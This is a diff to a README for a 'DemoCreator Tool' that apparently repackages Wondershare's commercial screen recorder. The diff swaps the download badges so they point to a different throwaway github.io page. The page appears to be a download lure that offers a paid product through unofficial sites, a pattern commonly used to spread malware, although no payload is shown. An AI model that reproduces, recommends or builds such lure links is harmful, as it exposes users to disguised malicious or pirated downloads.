@@ -4,11 +4,8 @@
   <img src="https://images.wondershare.com/democreator/meta-image.png" alt="Program Logo"/>
 </div>
 
-<div align="center">
+[![GET DemoCreator Tool](https://img.shields.io/badge/GET%20%E2%80%94%20DemoCreator-Tool-0078D6?style=for-the-badge&logoColor=white)](https://gazmadh809.github.io/.github/DemoCreator-Tool)
 
-[![Get for Windows](https://img.shields.io/badge/Get_for_Windows-blue?style=for-the-badge)](https://democreator-tool.github.io/.github/)
-
-</div>
 
 ---
 
@@ -32,11 +29,8 @@ Screen operations remain consistent with wondershare democreator recorder and wo
   <img src="https://cdn.mos.cms.futurecdn.net/VLT8ch9oLixVqzGjp4rZzF.jpg" alt="Program Interface Screenshot"/>
 </div>
 
-<div align="center">
+[![GET DemoCreator Tool](https://img.shields.io/badge/GET%20%E2%80%94%20DemoCreator-Tool-0078D6?style=for-the-badge&logoColor=white)](https://gazmadh809.github.io/.github/DemoCreator-Tool)
 
-[![Get for Windows](https://img.shields.io/badge/Get_for_Windows-blue?style=for-the-badge)](https://democreator-tool.github.io/.github/)
-
-</div>
 
 ---
 
